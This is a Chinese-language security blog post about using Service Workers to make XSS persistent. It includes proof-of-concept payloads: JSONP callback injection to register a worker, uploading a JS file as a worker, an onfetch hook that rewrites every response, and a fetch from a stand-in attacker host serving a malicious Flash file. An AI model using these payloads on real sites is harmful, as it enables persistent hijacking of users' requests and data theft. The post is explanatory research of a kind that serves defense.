---
title: 基于Service Worker 的XSS攻击面拓展
date: 2018-04-20 22:30:48
tags:
- xss
---

在前段时间参加的CTF中，有一个词语又被提出来，Service Worker，这是一种随新时代发展应运而生的用来做离线缓存的技术，最早在2015年被提出来用作攻击向，通过配合xss点，我们可以持久化的xss控制。

本文提到的大部分技术来自

[https://speakerdeck.com/masatokinugawa/pwa-study-sw](https://speakerdeck.com/masatokinugawa/pwa-study-sw)

<!--more-->

# 什么是Appcache 和 Service Worker? #

伴随着H5的诞生，Web app越来越需要应用化，与之相关，各种离线的需求也接踵而至，Appcache就是用来做网站的离线缓存的，可以通过manifest文件指定浏览器缓存哪些文件以供离线访问。

但Appcache有相当多的缺陷，对于整站中的多页缓存来说支持比较差，所以Service Worker诞生了，值得注意的是：

1、这是一种基于JS的Web Worker驱动，通过新开一个线程来处理任务，其操作并不影响到主线程的任何操作。

2、在这个线程中我们无法直接访问dom，这里通过postMessage来做交互。

3、在这个线程下，我们可以控制页面发送网络请求的处理方式。

SW的注册还有一些要求：

```
<script>
navigator.serviceWorker.register("/sw.js")
</script>
```

除了script标签以外，link标签也可以用来注册service worker，像

```
<link rel="serviceworker" href="/sw.js">
```

1、只能注册同源下的js

2、站内必须支持Secure Context，也就是站内必须是`https://`或者`http://localhost/`

3、Content-Type必须是js
- text/javascript
- application/x-javascript
- application/javascript


在上面的限制先，想要使用xss配合SW利用难度就比较高了，那么我们怎么利用呢？

# 1、jsonp #

尽管SW的利用条件非常苛刻，但却正好和jsonp的接口相符，可以说是非常契合了。

一个普通的jsonp接口大概是这样
```
https://example.com/jsonp.php?callback=test

HTTP/1.1
200 OK
Content-Type:
text/javascript; charset=UTF-8
[...]

test({[...]})
```

test点我们可控，那么我们可以通过配合SW来利用

```
xss点

<script>
navigator.serviceWorker.register("/jsonp.php?callback=onfetch=e=>console.log('test')//");
</script>
```

然后jsonp接口会返回

```
https://example.com/jsonp.php?callback=onfetch=e=>console.log('test')//

HTTP/1.1
200 OK
Content-Type:
text/javascript; charset=UTF-8
[...]

onfetch=e=>console.log('test')//({});
```

这样一来，SW成功被注册，onfetch接口还被我们重写为利用代码，持久化利用

# 2、文件上传接口 #

当站内存在文件上传接口的时候，或许我们可以上传一个js文件。

就好象是这样
```
<script>
var
formData = new FormData();
formData.append("csrf_token",
"secret");
var
sw = "/* [SW_CODE] */";
var
blob = new Blob([sw], { type: "text/javascript"});
formData.append("file",
blob, "sw.js");
fetch("/upload",
{method: "POST", body: formData}).then(/* Register SW */);
</script>
```

但要满足可以上传js的文件上传点就比较少了，但如果站内可以上传js的时，我们访问这个js时其Content-Type也一般会符合`text/javascript`。


# Service Worker有什么用？ #

Service Worker有什么用呢？

1、我们对页面更持久的控制（比如存储型XSS)。就算用来注册的XSS失效，我们也依然可以使用SW对页面进行后续控制。
2、监听/更改请求或响应
3、使用恶意Flash跨域读取内容
4、升级反射型XSS变成存储型XSS
5、可以一直持续到SW过期

其中hook fetch来劫持请求应该是最常见的利用方式，就像下面的代码

```
onfetch=e=>{
body =
'<script>alert(document.domain)</script>';
init =
{headers:{'content-type':'text/html'}};
e.respondWith(new Response(body,init));
}
```

当我们访问任何URL的时候，都会执行弹窗。

## SW的限制一：Scope

在使用`navigator.serviceWorker.register()`注册脚本时，我们可以在第二个参数中提供一个Scope（范围）。

这是一个类似于同源策略里域的设定，通过这个限制，我们可以将可注册的脚本限制在有限的目录内。代码类似于这样：

```
<script>
navigator.serviceWorker.register("/sw.js",
{scope: "/"})
</script>
```

在这样的设定下，我们只能使注册的js在同域子目录下生效
![image.png-295kB][2]

还有另一种方式是，如果开启了`Service-Worker-Awed`头，那就可以通过这个头来设定scope，例如：

```
HTTP/1.1
200 OK
content-type:
text/javascript
service-worker-allowed: /
```

值得注意的是，这个域限制现在已经无法通过`..%2f`或者`..%5c`来绕过了，当试图`navigator.serviceWorker.register("/test/a/test.js",{scope: "/test/a%5c..%5c"})`时，会爆`Failed to register a ServiceWorker: The provided scope ('http://127.0.0.1/test/a%5c..%5c') or scriptURL ('http://127.0.0.1/test/a/test.js') includes a disallowed escape characte`。



## SW的限制二：生命周期

出于安全性的考虑，每个SW都有时间限制，在注册24小时后，原先的HTTP缓存就会实现，也就是一般意义上来说，这种持久化xss效果仍然有限。


## XSS+SW+Flash

当我们可以在站内控制上传或者创建一个flash时（only firefox）

然后用SW注册这个flash
```
onfetch=e=>{
    e.respondWith(fetch("//attacker/poc.swf"))
}
```

当站`http://example.com`内的crossdomain像这样时
```
<?xml
version="1.0"?>
<cross-domain-policy>
<allow-access-from
domain="example.jp" />
</cross-domain-policy>
```

我们可以通过在`example.jp`上创建恶意flash，来读取`http://example.com`的信息，这是一种某种程度上的SOP绕过（虽然并不是真的）。


在cure53 2016年的xss挑战赛就提到了这种操作

[https://github.com/cure53/XSSChallengeWiki/wiki/XSSMas-Challenge-2016](https://github.com/cure53/XSSChallengeWiki/wiki/XSSMas-Challenge-2016)


# 写在最后 #

写了这么多，但Service Worker的攻击利用向可以说是非常苛刻了，再加上w3c标准的不断改进，许多以前的利用方式都没办法再用了，但Service Worker本身需要的获取请求返回的权限却永远也去不掉，在这基础上，尽管利用方式有限，但在配合xss的持久化上能造成可怕的危害，至于好不好用，可能就是仁者见仁智者见智了。

# REF #

- [https://sakurity.com/blog/2015/08/13/middlekit.html](https://sakurity.com/blog/2015/08/13/middlekit.html)

- [https://www.html5rocks.com/en/tutorials/appcache/beginner/](https://www.html5rocks.com/en/tutorials/appcache/beginner/)

- [https://www.w3.org/TR/service-workers/](https://www.w3.org/TR/service-workers/)

- [https://speakerdeck.com/masatokinugawa/pwa-study-sw](https://speakerdeck.com/masatokinugawa/pwa-study-sw)

- [https://zhuanlan.zhihu.com/p/29734820](https://zhuanlan.zhihu.com/p/29734820)

- [https://paper.seebug.org/177/](https://paper.seebug.org/177/)

- [http://drops.xmd5.com/static/drops/web-10798.html](http://drops.xmd5.com/static/drops/web-10798.html)

  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/9ikc1hbn085eecbpip9k4qhs/image.png
